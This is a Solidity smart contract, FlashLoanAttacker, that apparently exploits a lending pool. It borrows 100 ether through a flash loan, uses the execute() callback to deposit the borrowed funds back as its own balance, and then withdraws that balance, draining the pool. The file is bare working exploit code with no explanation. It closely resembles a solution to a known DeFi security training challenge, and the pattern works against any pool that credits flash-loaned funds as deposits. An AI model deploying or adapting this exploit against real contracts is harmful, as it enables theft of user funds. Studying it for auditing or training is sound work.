// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanPool {
    function flashLoan(uint256 amount) external;

    function deposit() external payable;

    function withdraw() external;
}

contract FlashLoanAttacker is Ownable {
    IFlashLoanPool private immutable pool;

    constructor(address poolAddress) {
        pool = IFlashLoanPool(poolAddress);
    }

    function attack() external onlyOwner {
        pool.flashLoan(100 ether);
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
    }

    receive() external payable {}
}
